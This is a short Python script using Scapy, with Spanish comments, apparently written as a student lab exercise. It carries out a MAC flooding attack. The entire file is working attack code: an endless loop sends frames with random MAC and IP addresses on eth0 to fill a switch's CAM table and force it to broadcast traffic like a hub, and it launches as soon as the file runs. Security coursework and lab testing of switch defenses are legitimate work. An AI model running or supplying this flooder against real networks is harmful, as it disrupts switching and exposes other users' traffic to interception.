from scapy.all import *

def jonath_mac_flood(interfaz):
    """
    Función principal del ataque MAC Flooding.
    Satura la tabla CAM del switch con MACs falsas
    forzándolo a comportarse como un hub.
    """
    print("=" * 50)
    print("  MAC Flooding - Jonathan Sención 20250851")
    print("=" * 50)
    print(f"[*] Interfaz objetivo: {interfaz}")
    print("[*] Iniciando saturación de tabla CAM...")
    print("[*] Presiona Ctrl+C para detener\n")
    
    contador = 0
    while True:
        # Generamos MACs e IPs completamente aleatorias
        paquete = (Ether(src=RandMAC(), dst=RandMAC()) /
                   IP(src=RandIP(), dst=RandIP()) /
                   UDP())
        
        # Enviamos el paquete para llenar la tabla CAM
        sendp(paquete, iface=interfaz, verbose=False)
        contador += 1
        print(f"[*] Tramas enviadas a tabla CAM: {contador}", end="\r")

# Punto de entrada del script
jonath_mac_flood("eth0")
